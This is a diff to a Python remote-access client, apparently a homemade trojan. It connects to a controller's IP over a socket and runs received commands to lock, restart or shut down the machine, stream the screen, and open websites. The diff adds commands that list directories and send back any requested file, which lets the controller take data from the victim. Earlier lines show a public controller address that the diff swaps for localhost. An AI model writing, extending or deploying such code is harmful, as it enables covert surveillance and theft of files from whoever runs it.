@@ -2,12 +2,14 @@ import socket
 import os
 import traceback
 import shutil
-#from vidstream import ScreenShareClient
+from vidstream import ScreenShareClient
 import threading
 import time
 import webbrowser
+import sys
 
-ip = "77.250.137.62"
+
+ip = "127.0.0.1"
 port = 8080
 keepgoing = True
 
@@ -41,10 +43,15 @@ def main():
                     lock()
                 elif msg == "restart":
                     restart()
+                elif msg == "getcwd":
+                    getcwd(sockk)
+                elif msg == "files":
+                    files(sockk)
+                elif msg == "download":
+                    download(sockk)
 
-        except:
-            traceback.print_exc()
-            continue
+        except Exception as err:
+            print(Exception, err)
 
 def connnect():
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -53,13 +60,29 @@ def connnect():
     return sock
 
 
+def download(sock):
+    ftd = sock.recv(1024)
+    ftd = ftd.decode()
+    file = open(ftd, 'rb')
+    data = file.read()
+    sock.send(data)
+
 def recv(sock):
     msg = sock.recv(1024)
     msg = msg.decode()
     return msg
 
-def exit():
-    keepgoing = False
+
+def files(sock):
+    dir = sock.recv(1024)
+    dir = dir.decode()
+    output = os.listdir(dir)
+    output = str(output)
+    sock.send(output.encode())
+
+def getcwd(sock):
+    cwd = os.getcwd()
+    sock.send(cwd.encode())
 
 
 def username(sock):
@@ -68,13 +91,13 @@ def username(sock):
 
 
 def screenshare():
-    return
-    """sock.close()
-    sender = ScreenShareClient("77.250.137.62", 8080)
+    sock.close()
+    sender = ScreenShareClient("127.0.0.1", 8080)
     t = threading.Thread(target=sender.start_stream)
     t.start()
-    time.sleep(10)
-    sender.stop_stream()"""
+    time.sleep(60)
+    sender.stop_stream()
+    connect()
 
 
 def website(sock):
@@ -93,10 +116,10 @@ def shutdown():
 
 
 def lock():
-    os.system("shutdown /s /l 1")
+    os.system("shutdown /l")
 
 
 def restart():
-    os.system("shutdown /s /r 1")
+    os.system("shutdown /r /t 1")
 
 main()
